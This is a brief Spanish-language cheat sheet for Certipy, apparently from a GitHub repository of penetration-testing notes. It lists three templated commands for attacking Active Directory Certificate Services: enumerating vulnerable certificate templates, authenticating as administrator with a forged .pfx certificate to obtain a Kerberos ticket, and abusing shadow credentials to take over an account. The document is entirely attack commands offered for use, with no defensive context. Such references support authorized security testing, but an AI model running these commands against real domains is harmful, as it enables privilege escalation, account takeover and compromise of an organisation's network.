# Certipy Cheat Sheet

#### Conocer el nivel y saber que template es vulnerable
```
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <IP-DC> -vulnerable -stdout
```

#### Autenticarse usando el TGT creado (administrator.pfx)
```
certipy auth -pfx 'administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip <IP-DC>
```

#### Abuso de credenciales ocultas para la apropiación de cuentas
```
certipy shadow auto -u '<USERNAME>' -p '<PASSWORD>' -account '<ACCOUNT_NAME>' -dc-ip <IP-DC>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)